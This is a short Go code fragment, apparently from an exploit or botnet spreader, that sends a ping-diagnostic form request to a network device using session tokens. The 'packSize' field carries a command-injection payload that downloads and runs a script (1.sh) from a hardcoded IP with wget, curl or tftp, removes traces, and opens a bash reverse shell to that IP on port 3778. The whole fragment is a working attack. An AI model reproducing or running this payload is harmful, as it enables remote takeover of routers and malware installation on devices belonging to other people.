...
func sendPingRequest(ipPort, sysauth, stok string) {
	...
	formFields := map[string]string{
		"destination": "1.1.1.1",
		"packCount":   "4",
		"packSize":    "56`cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.137.37/1.sh -q || curl -s http://178.16.137.37/1.sh -o 1.sh; chmod +x 1.sh; ./1.sh & tftp 178.16.137.37 -c get 1.sh 2>/dev/null && chmod +x 1.sh && ./1.sh & sleep 1; rm -f 1.sh 2.sh 3.sh 2>/dev/null; bash -c 'bash -i >& /dev/tcp/178.16.137.37/3778 0>&1' 2>/dev/null &`",
		"isStart":     "Start",
	}
